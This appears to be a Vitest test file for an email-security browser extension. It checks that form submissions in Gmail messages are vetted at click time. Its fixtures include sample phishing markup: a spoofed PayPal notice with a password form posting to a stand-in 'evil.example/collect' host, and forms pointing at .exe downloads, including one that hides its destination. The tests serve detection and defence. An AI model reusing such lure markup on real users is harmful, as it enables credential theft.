// @vitest-environment happy-dom
// @vitest-environment-options {"url":"https://mail.google.com/mail/u/0/#inbox"}
// Click-time destination checks for form submissions on an email that is NOT locked (safe body, untrusted sender),
// as content.click-time.test.ts does for links. A submission to another site is cancelled and decided at click
// time: checked locally, then its registrable domain (and nothing else) is looked up. A risky destination goes to
// the warning page, which is given the destination only (never the form's fields); a safe one is submitted again,
// unchanged (same submitter, so the same formaction, method and fields). The destination is read through the
// attributes, so a control named "action" cannot hide the real one.
import { beforeAll, describe, expect, it, vi } from 'vitest';
import {
  $,
  type Msg,
  bootContent,
  gmailMessage,
  lastVerdict,
  lookups,
  navigations,
  settled,
  submit,
  tick,
  until,
} from './harness';

const DAY = 86_400_000;
const intelFor = (domain: string, over: { rdap?: object; dns?: object } = {}) => ({
  domain,
  checkedAt: new Date().toISOString(),
  rdap: { status: 'ok', registered: new Date(Date.now() - 900 * DAY).toISOString() },
  dns: { status: 'ok', mx: ['mx.example.net'], nxdomain: false },
  reputation: { status: 'ok', source: 'URIBL', listed: [] },
  ...over,
});
const INTEL: Record<string, unknown> = {
  'contoso.example': intelFor('contoso.example', { rdap: { status: 'notfound' }, dns: { status: 'ok', mx: [], nxdomain: true } }),
  'northwind.example': intelFor('northwind.example'),
};

const PAGE = gmailMessage({
  name: 'Shop billing',
  email: 'billing@shop.example',
  subject: 'Your statement',
  body: `Hello, your monthly statement is ready.
    <form id="exe" action="https://files.example/invoice.exe" method="post">
      <input type="password" name="pw" value="hunter2"><button id="exe-go">Sign in to view</button></form>
    <form id="nx" action="https://contoso.example/login" method="post">
      <input type="password" name="pw" value="hunter2"><button id="nx-go">Sign in</button></form>
    <form id="ok" action="https://northwind.example/survey" method="post">
      <input name="rating" value="5"><button id="ok-go">Send</button></form>
    <form id="own" action="https://shop.example/search"><input name="q" value="socks"></form>
    <form id="fa" action="https://shop.example/search">
      <button id="fa-go" formaction="https://files.example/setup.exe">Download</button></form>
    <form id="clob" action="https://files.example/update.exe"><input name="action" value="https://shop.example/"></form>
    <form id="dlg" method="dialog"><button id="dlg-go">Close</button></form>
    <button id="out-go" form="webmail-search" formaction="https://files.example/remote.exe">Open</button>`,
})
  // The webmail's own form, outside the email.
  + '<form id="webmail-search" action="https://mail.google.com/mail/u/0/#search"><input name="q"></form>';

// Shown later, each submitted before its first scan has run (race-to-click).
const EARLY = gmailMessage({
  name: 'Fabrikam orders',
  email: 'orders@fabrikam.example',
  subject: 'RSVP',
  body: `Will you join us? <form id="early" action="https://northwind.example/rsvp" method="post">
    <input name="answer" value="yes"><button id="early-go">Reply</button></form>`,
});
const PHISHING = gmailMessage({
  name: 'PayPal Support',
  email: 'help@paypa1-secure.example',
  subject: 'Account notice',
  body: `Your PayPal account is locked. Verify your password now or it will be suspended.
    <a href="https://evil.example/login">www.paypal.com</a>
    <form id="phish" action="https://evil.example/collect" method="post">
      <input type="password" name="pw" value="hunter2"><button id="phish-go">Verify</button></form>`,
});

let sent: Msg[];
// The guard re-submits a cleared form with HTMLFormElement.prototype.requestSubmit; record those submissions (and
// whether the extension let them through) instead of letting happy-dom navigate.
const resubmitted: { form: string; submitter: string | null; cancelled: boolean }[] = [];

beforeAll(async () => {
  vi.spyOn(HTMLFormElement.prototype, 'requestSubmit').mockImplementation(function (
    this: HTMLFormElement,
    submitter?: HTMLElement | null,
  ) {
    const cancelled = submit(this, submitter ?? null);
    resubmitted.push({ form: this.id, submitter: submitter?.id ?? null, cancelled });
  });
  ({ sent } = await bootContent(PAGE, {
    // In a browser, <input name="action"> shadows form.action; happy-dom does not, so emulate it.
    beforeMain: () => {
      Object.defineProperty($('clob'), 'action', { value: $('clob').querySelector('input'), configurable: true });
    },
    intel: (domain: unknown) => INTEL[String(domain)],
  }));
  await settled(sent);
});

describe('content.ts: click-time checks of form submissions on an unlocked email', () => {
  it('scores the email safe and leaves it unlocked', () => {
    expect(lastVerdict(sent)).toMatchObject({ verdict: { level: 'safe' }, trusted: false });
    expect(document.querySelector('div.a3s')!.hasAttribute('data-ped-locked')).toBe(false);
  });

  it('sends a password form posting to a risky file type to the warning page, without its fields', async () => {
    const mark = sent.length;
    expect(submit($('exe'), $('exe-go'))).toBe(true);
    await until(() => expect(navigations(sent, mark)).toHaveLength(1));
    expect(navigations(sent, mark)[0]).toEqual({
      type: 'openWarning',
      href: 'https://files.example/invoice.exe',
      host: 'files.example',
      registrable: 'files.example',
      level: 'danger',
      reasons: [expect.stringMatching(/risky file type \(\.exe\)/)],
      kind: 'form',
    });
    expect(JSON.stringify(sent.slice(mark))).not.toContain('hunter2');
    expect(lookups(sent, mark)).toEqual([]); // decided locally
    expect(resubmitted).toEqual([]);
  });

  it('looks up the destination domain only and warns when it does not exist', async () => {
    const mark = sent.length;
    expect(submit($('nx'), $('nx-go'))).toBe(true);
    await until(() => expect(navigations(sent, mark)).toHaveLength(1));
    expect(lookups(sent, mark)).toEqual(['contoso.example']);
    expect(navigations(sent, mark)[0]).toMatchObject({
      type: 'openWarning',
      href: 'https://contoso.example/login',
      level: 'danger',
      intel: { domain: 'contoso.example' },
    });
    expect(JSON.stringify(sent.slice(mark))).not.toContain('hunter2');
    expect(resubmitted).toEqual([]);
  });

  it('submits the form again, unchanged, once its destination checks out', async () => {
    const mark = sent.length;
    expect(submit($('ok'), $('ok-go'))).toBe(true);
    await until(() => expect(resubmitted).toHaveLength(1));
    expect(lookups(sent, mark)).toEqual(['northwind.example']);
    // Same submitter (so the same formaction and method), and the extension lets this submission through.
    expect(resubmitted).toEqual([{ form: 'ok', submitter: 'ok-go', cancelled: false }]);
    expect(navigations(sent, mark)).toEqual([]);
    resubmitted.length = 0;
  });

  it("lets a submission to the sender's own site through natively", () => {
    const mark = sent.length;
    expect(submit($('own'))).toBe(false);
    expect(lookups(sent, mark)).toEqual([]);
  });

  it("checks the submit button's formaction, which overrides the form's action", async () => {
    const mark = sent.length;
    expect(submit($('fa'), $('fa-go'))).toBe(true);
    await until(() => expect(navigations(sent, mark)).toHaveLength(1));
    expect(navigations(sent, mark)[0]).toMatchObject({ type: 'openWarning', href: 'https://files.example/setup.exe' });
  });

  it('reads the action attribute, not a form control named "action"', async () => {
    const mark = sent.length;
    expect(submit($('clob'))).toBe(true);
    await until(() => expect(navigations(sent, mark)).toHaveLength(1));
    expect(navigations(sent, mark)[0]).toMatchObject({ type: 'openWarning', href: 'https://files.example/update.exe' });
  });

  it('checks a submit button in the email that submits a form outside it (form="id")', async () => {
    expect(submit($('webmail-search')), "the webmail's own submission").toBe(false);
    const mark = sent.length;
    expect(submit($('webmail-search'), $('out-go'))).toBe(true);
    await until(() => expect(navigations(sent, mark)).toHaveLength(1));
    expect(navigations(sent, mark)[0]).toMatchObject({ type: 'openWarning', href: 'https://files.example/remote.exe' });
  });

  it("never reads the fields of the webmail's own forms (that fires a formdata event at them)", () => {
    const original = globalThis.FormData;
    let built = 0;
    globalThis.FormData = class extends original {
      constructor(...args: ConstructorParameters<typeof FormData>) {
        super(...args);
        built++;
      }
    } as typeof FormData;
    try {
      expect(submit($('webmail-search'))).toBe(false);
    } finally {
      globalThis.FormData = original;
    }
    expect(built).toBe(0);
  });

  it('leaves a dialog form alone (it navigates nowhere)', async () => {
    const mark = sent.length;
    expect(submit($('dlg'), $('dlg-go'))).toBe(false);
    await tick();
    expect(navigations(sent, mark)).toEqual([]);
    expect(resubmitted).toEqual([]);
  });

  it('holds a submission made before the first scan, then submits it once the email checks out', async () => {
    const mark = sent.length;
    document.body.innerHTML = EARLY; // the webmail opens another email
    await tick(); // its scan is now scheduled (400 ms debounce)
    expect(submit($('early'), $('early-go'))).toBe(true);
    await until(() => expect(resubmitted).toHaveLength(1));
    expect(resubmitted).toEqual([{ form: 'early', submitter: 'early-go', cancelled: false }]);
    expect(lastVerdict(sent)).toMatchObject({ verdict: { level: 'safe' }, sender: { address: 'orders@fabrikam.example' } });
    expect(lookups(sent, mark)).toEqual(['fabrikam.example', 'northwind.example']);
    expect(navigations(sent, mark)).toEqual([]);
    resubmitted.length = 0;
  });

  it('drops a submission held for the first scan when that scan locks the email', async () => {
    const mark = sent.length;
    document.getElementById('ped-toast-host')?.remove();
    document.body.innerHTML = PHISHING;
    await tick();
    expect(submit($('phish'), $('phish-go'))).toBe(true);
    await settled(sent, mark);
    expect(document.querySelector('div.a3s')!.hasAttribute('data-ped-locked')).toBe(true);
    expect(document.getElementById('ped-toast-host'), '"paused" notice').not.toBeNull();
    expect(resubmitted).toEqual([]);
    expect(navigations(sent, mark)).toEqual([]);
    expect(JSON.stringify(sent.slice(mark))).not.toContain('hunter2');
  });
});
